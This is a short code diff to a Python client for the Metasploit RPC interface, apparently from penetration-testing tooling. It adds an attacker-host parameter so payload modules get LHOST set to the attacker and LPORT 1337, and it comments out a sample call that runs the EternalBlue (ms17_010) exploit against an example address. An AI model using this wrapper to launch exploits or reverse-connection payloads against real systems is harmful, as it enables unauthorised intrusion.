@@ -165,11 +165,11 @@ class Client(object):
         str(ses_id)
         res = self.send_command(["session.meterperter_read",self.token,ses_id])
         return res
-    def run_module(self,_type,name,HOST,PORT,payload=False):
+    def run_module(self,_type,name,HOST,PORT,ATTACKER,payload=False):
         #module.execute
         # moduletype moduleName
         if payload != False:
-            d = ["module.execute",self.token,_type,name,{"LHOST":HOST,"LPORT":PORT}]
+            d = ["module.execute",self.token,_type,name,{"LHOST":ATTACKER,"LPORT":1337}]
         else:
             d = ["module.execute",self.token,_type,name,{"RHOST":HOST,"RPORT":PORT}]
         res = self.send_command(d)
@@ -186,4 +186,4 @@ if __name__ == "__main__":
     print(auth.write_console(1,"ls"))
     print(auth.destroy_console(1))
     print(auth.list_sessions())
-    print(auth.run_module("exploit","ms17_010_eternalblue","1.1.1.1","1"))
+    # print(auth.run_module("exploit","ms17_010_eternalblue","1.1.1.1","1"))
